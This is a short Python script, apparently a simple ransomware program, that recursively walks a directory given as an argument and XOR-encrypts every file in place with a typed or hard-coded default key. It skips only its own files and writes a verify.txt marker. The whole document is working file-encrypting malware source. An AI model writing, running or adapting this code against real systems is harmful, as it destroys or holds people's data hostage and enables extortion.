import os, sys

def cipher(file,key):
    data=bytearray(open(file,"rb").read())
    while len(key)<len(data):
        key+=key
    for i in range(len(data)):
        data[i]^=ord(key[i])
    open(file,"wb").write(data)
    
def ransom(way):
    directory=os.listdir(way)
    for dir in directory:
        if dir in exclu:
            continue
        if os.path.isdir(f"{way}/{dir}"):
            ransom(f"{way}/{dir}/")
        else:
            cipher(f"{way}/{dir}",key)

os.system('clear')
exclu=["ransom.py","save.py"]
exclu=["ransom.py","save.py","path.txt"]
path= sys.argv[1]
key = input("Enter a key: ")
if key =="":
    key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
open(path+"/verify.txt","w").write("That's the good key!")
ransom(path)
print("Done!")
